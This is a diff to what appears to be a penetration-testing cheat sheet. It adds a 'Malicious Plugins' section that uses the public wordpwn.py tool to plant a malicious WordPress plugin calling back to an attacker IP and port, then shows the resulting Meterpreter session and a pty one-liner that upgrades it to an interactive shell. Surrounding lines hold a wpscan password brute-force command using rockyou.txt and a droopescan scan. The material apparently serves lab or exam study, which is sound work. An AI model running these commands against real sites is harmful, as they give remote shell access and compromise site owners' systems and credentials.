@@ -94,6 +94,16 @@ wpscan --url http://$IP/wp/
 ````
 wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
 ````
+###### Malicous Plugins
+````
+https://github.com/wetw0rk/malicious-wordpress-plugin
+python3 wordpwn.py 192.168.119.140 443 Y
+
+meterpreter > shell
+Process 1098 created.
+Channel 0 created.
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+````
 ###### Drupal scan
 ````
 droopescan scan drupal -u http://10.11.1.50:80
